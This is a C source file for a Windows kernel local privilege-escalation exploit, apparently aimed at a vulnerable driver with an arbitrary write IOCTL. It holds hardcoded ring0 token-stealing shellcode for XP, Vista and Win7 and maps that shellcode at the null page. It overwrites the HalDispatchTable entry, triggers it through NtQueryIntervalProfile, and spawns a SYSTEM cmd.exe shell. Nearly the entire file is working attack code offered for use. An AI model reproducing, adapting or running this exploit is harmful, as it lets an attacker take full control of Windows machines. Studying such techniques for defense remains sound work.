/*
    @0vercl0k - Feel my l33tness - 0vercl0k.tuxfamily.org :)
*/

#include <windows.h>
#include <winioctl.h>

#define IOCTL_WRIT CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define DEVICE_NAME "\\\\.\\4"

#if !defined(NT_SUCCESS)
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#if !defined(STATUS_SUCCESS)
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

typedef enum _SYSTEM_INFORMATION_CLASS
{
    SystemBasicInformation,
    SystemProcessorInformation,
    SystemPerformanceInformation,
    SystemTimeOfDayInformation,
    SystemPathInformation,
    SystemProcessInformation,
    SystemCallCountInformation,
    SystemDeviceInformation,
    SystemProcessorPerformanceInformation,
    SystemFlagsInformation,
    SystemCallTimeInformation,
    SystemModuleInformation
} SYSTEM_INFORMATION_CLASS,
*PSYSTEM_INFORMATION_CLASS;

typedef struct
{
    ULONG Reserved1;
    ULONG Reserved2;
    PVOID ImageBaseAddress;
    ULONG ImageSize;
    ULONG Flags;
    WORD Id;
    WORD Rank;
    WORD w018;
    WORD NameOffset;
    BYTE Name[256];
} SYSTEM_MODULE, *PSYSTEM_MODULE;

#pragma warning(disable:4200)
typedef struct
{
    ULONG ModulesCount;
    SYSTEM_MODULE Modules[0];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef struct
{
    DWORD* where;
    DWORD what;
} L33TNESS,
*PL33TNESS;

extern NTSTATUS WINAPI ZwQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

/*
    HalDispatchTable trickz :

* Pointer nt!HalDispatchTable+4 is writeable (this symbol is obviously exported)
    kd> dps nt!HalDispatchTable l 2
    80544a38  00000003
    80544a3c  806e4bba hal!HaliQuerySystemInformation
    kd> !pte 80544a3c
                        VA 80544a3c
    PDE at C0602010            PTE at C0402A20
    contains 00000000004001E3  contains 0000000000000000
    pfn 400       -GLDA--KWEV   LARGE PAGE pfn 544

* How to call this pointer from kernel ?
    kd> uf nt!NtQueryIntervalProfile
    nt!NtQueryIntervalProfile:
    [...]
    8060c88a e83de00200      call    nt!KeQueryIntervalProfile (8063a8cc)

    kd> uf nt!KeQueryIntervalProfile
    [...]
    8063a8fd ff153c4a5480    call    dword ptr [nt!HalDispatchTable+0x4 (80544a3c)]

*/

typedef enum _KPROFILE_SOURCE {
    ProfileTime
    /* ... */
} KPROFILE_SOURCE, *PKPROFILE_SOURCE;

typedef enum
{
    WinXp,
    WinVista,
    Win7,
    UnknownVersion
} WINDOWS_OS_VERSION;

extern NTSTATUS WINAPI NtAllocateVirtualMemory(
  __in     HANDLE ProcessHandle,
  __inout  PVOID *BaseAddress,
  __in     ULONG_PTR ZeroBits,
  __inout  PSIZE_T RegionSize,
  __in     ULONG AllocationType,
  __in     ULONG Protect
);

extern NTSTATUS NTAPI NtQueryIntervalProfile(
    KPROFILE_SOURCE ProfileSource,
    PULONG Interval
);

VOID SetExecutionOnCore0()
{
    DWORD_PTR mask = 1;

    /* Le trick du KdVersionBlock fonctionne que sur le core0, (les autres core n'ont pas l'info dans le KPCR !#@) */
    SetProcessAffinityMask(
        GetCurrentProcess(),
        mask
    );
}

WINDOWS_OS_VERSION GetWindowsVersion()
{
    WINDOWS_OS_VERSION v;
    DWORD version;
    DWORD minVersion, majVersion;

    version    = GetVersion();
    minVersion = (DWORD) (HIBYTE(LOWORD(version)));
    majVersion = (DWORD) (LOBYTE(LOWORD(version)));

    if(minVersion == 1 && majVersion == 6)
        v = Win7;
    else if(minVersion == 0 && majVersion == 6)
        v = WinVista;
    else if(minVersion == 1 && majVersion == 5)
        v = WinXp;
    else
        v = UnknownVersion;

    return v;
}

PBYTE GetElevationOfPrivilegeShellcode()
{
    /* /!\ DO NOT FORGOT TO CALL SetExecutionOnCore0 */
    /* Get the SYSTEM's token EoP - ring0 */
    static BYTE escalade_privileges_ring0_winxp[] = "\x60\x66\xbb\x24\x01\x64\x67\x8b\x07\x8b\x40\x44\x89\xc5\x31\xc9\xb1\x88\x66\x01\xc8\x8b\x10\x89"
    "\xd0\x83\x7a\xfc\x04\x74\x02\xeb\xf4\x80\xea\x88\x80\xc2\xc8\x8b\x32\x31\xd2\xb2\xc8\x89\x34\x2a\x61\xc3";

    static BYTE escalade_privileges_ring0_win7[] = "\x60\x66\xbb\x24\x01\x64\x67\x8b\x07\x8b\x40\x50\x89\xc5\x31\xc9\xb1\xb8\x66\x01\xc8\x8b\x10\x89"
    "\xd0\x83\x7a\xfc\x04\x74\x02\xeb\xf4\x80\xea\xb8\x80\xc2\xf8\x8b\x32\x31\xd2\xb2\xf8\x89\x34\x2a\x61\xc3";

    static BYTE escalade_privileges_ring0_winvista[] = "\x60\x66\xbb\x24\x01\x64\x67\x8b\x07\x8b\x40\x48\x89\xc5\x31\xc9\xb1\xa0\x66\x01\xc8\x8b\x10\x89"
    "\xd0\x83\x7a\xfc\x04\x74\x02\xeb\xf4\x80\xea\xa0\x80\xc2\xe0\x8b\x32\x31\xd2\xb2\xe0\x89\x34\x2a\x61\xc3";

    PBYTE sh = NULL;

    /* Only the core 0 have debug information in its KPCR structure */
    /* And those shellcodes need this piece of information */
    SetExecutionOnCore0();

    switch(GetWindowsVersion())
    {
        case WinXp:
            sh = escalade_privileges_ring0_winxp;
        break;

        case WinVista:
            sh = escalade_privileges_ring0_winvista;
        break;

        case Win7:
            sh = escalade_privileges_ring0_win7;
        break;

        case UnknownVersion:
            printf("The Windows version is not recognized, stopping the exploit right now : ( !");
            sh = NULL;
        break;
    }

    return sh;
}

BOOL AllocateNullPage(DWORD size)
{
	NTSTATUS status;
	DWORD addr = 1, len = size;

	status = NtAllocateVirtualMemory(
        GetCurrentProcess(),
        (PVOID*)&addr,
        0,
        &len,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    );

	if(!NT_SUCCESS(status))
	{
		printf("[-] Error with ZwAllocateVirtualMemory : 0x%.8x\n", status);
		return FALSE;
	}

	return TRUE;
}

PSYSTEM_MODULE GetKernelInformation()
{
    PSYSTEM_MODULE_INFORMATION pModuleList = NULL;
    PSYSTEM_MODULE pKernInfo = NULL;
    NTSTATUS status = STATUS_SUCCESS;
    ULONG neededSize = 0;

    ZwQuerySystemInformation(
        SystemModuleInformation,
        &neededSize,
        0,
        &neededSize
    );

    pModuleList = (PSYSTEM_MODULE_INFORMATION)malloc(neededSize);
    if(pModuleList == NULL)
    {
        printf("Error with malloc().\n");
        return NULL;
    }

    status = ZwQuerySystemInformation(SystemModuleInformation,
        pModuleList,
        neededSize,
        0
    );

    if(!NT_SUCCESS(status))
    {
        printf("Error with ZwQuerySystemInformation().\n");
        free(pModuleList);
        return NULL;
    }

    pKernInfo = (PSYSTEM_MODULE)malloc(sizeof(SYSTEM_MODULE));
    if(pKernInfo == NULL)
    {
        printf("Error with malloc().\n");
        free(pModuleList);
        return NULL;
    }

    memcpy(pKernInfo, pModuleList->Modules, sizeof(SYSTEM_MODULE));
    free(pModuleList);

    return pKernInfo;
}

DWORD GetKernelBase()
{
    PSYSTEM_MODULE pKernInfo = NULL;
    DWORD kernBase = 0;

    pKernInfo = GetKernelInformation();
    if(pKernInfo == NULL)
    {
        printf("Error with GetKernelInformation().\n");
        return 0;
    }

    kernBase = (DWORD)pKernInfo->ImageBaseAddress;
    free(pKernInfo);

    return kernBase;
}

PCHAR GetKernelPath()
{
    PSYSTEM_MODULE pKernInfo = NULL;
    PCHAR kernPath = NULL;
    DWORD size = 0;

    pKernInfo = GetKernelInformation();
    if(pKernInfo == NULL)
    {
        printf("Error with GetKernelInformation().\n");
        return 0;
    }

    size = sizeof(char) * (strlen(pKernInfo->Name) + 1);
    kernPath = (PCHAR)malloc(size);
    if(kernPath == NULL)
    {
        free(pKernInfo);
        printf("Error with malloc().\n");
        return NULL;
    }

    ZeroMemory(kernPath, size);
    memcpy(kernPath, pKernInfo->Name, size - sizeof(char));
    free(pKernInfo);

    return kernPath;
}

DWORD GetHalQuerySystemInformation()
{
    HMODULE hKern = 0;
    PCHAR pKernPath = NULL, pKern = NULL;
    DWORD HalDispatchTable = 0, kernBase = 0;

    kernBase = GetKernelBase();
    printf("[+] Kernel Base Address: 0x%.8X\n", kernBase);
    if(kernBase == 0)
    {
        printf("[!] Error with GetKernelBase().\n");
        goto clean;
    }

    pKernPath = GetKernelPath();
    if(pKernPath == NULL)
    {
        printf("[!] Error with GetKernelPath().\n");
        goto clean;
    }

    printf("[+] Kernel Path: '%s'\n", pKernPath);
    pKern = strrchr(pKernPath, '\\') + 1;

    printf("[+] Kernel: '%s'\n", pKern);
    hKern = LoadLibraryEx(pKern, NULL, DONT_RESOLVE_DLL_REFERENCES);

    printf("[+] Kernel Base Address (in this process context): 0x%.8X\n", hKern);
    HalDispatchTable = (DWORD)GetProcAddress(hKern, "HalDispatchTable");
    printf("[+] HalDispatchTable Address: 0x%.8X\n", HalDispatchTable);
    if(HalDispatchTable == 0)
    {
        printf("[!] Error with GetProcAddress().\n");
        goto clean;
    }

    HalDispatchTable -= (DWORD)hKern;
    HalDispatchTable += kernBase;

    printf("[+] HalDispatchTable Address (after normalization): 0x%.8X\n");

    clean:
    if(pKernPath != NULL)
        free(pKernPath);

    if(hKern != NULL)
        FreeLibrary(hKern);

    return HalDispatchTable + sizeof(DWORD);
}

int main()
{
    PROCESS_INFORMATION pi = {0};
    STARTUPINFO si = {0};
    L33TNESS l33t = {0};
    HANDLE hDevice = NULL;
    DWORD byte = 0, osef = 0, HalQuerySystemInformation = 0;
    PBYTE escalade_privileges_ring0 = NULL;

    printf("[+] Allocating memory..\n");
    if(AllocateNullPage(0x2000) == FALSE)
    {
        printf("Error with AllocateNullPage().\n");
        return EXIT_FAILURE;
    }

    escalade_privileges_ring0 = GetElevationOfPrivilegeShellcode();
    if(escalade_privileges_ring0 == NULL)
    {
        printf("Error with GetElevationOfPrivilegeShellcode().\n");
        return EXIT_FAILURE;
    }

    HalQuerySystemInformation = GetHalQuerySystemInformation();

    printf("[+] Copying the ring0 shellcode..\n");

    memcpy((PVOID)0, escalade_privileges_ring0, strlen(escalade_privileges_ring0));

    /* On recupère un handle sur le driver */
    hDevice = CreateFile(
        DEVICE_NAME,
        GENERIC_WRITE | GENERIC_READ,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if(hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] Error with Createfile : %.8x.\n", GetLastError());
        return EXIT_FAILURE;
    }

    l33t.where = (PDWORD)HalQuerySystemInformation;
    l33t.what = 0;

    /* On envoit la sauce ! */
    DeviceIoControl(
        hDevice,
        IOCTL_WRIT,
        &l33t,
        sizeof(l33t),
        NULL,
        0,
        &byte,
        NULL
    );

    CloseHandle(hDevice);

    NtQueryIntervalProfile(2, &osef);

    printf("All right, it's time to execute a shell..\n..with more privileges actually !\n");

	si.cb = sizeof(si);

	CreateProcess(
        NULL,
        "cmd.exe",
        NULL,
        NULL,
        TRUE,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &si,
        &pi
    );

    return EXIT_SUCCESS;
}
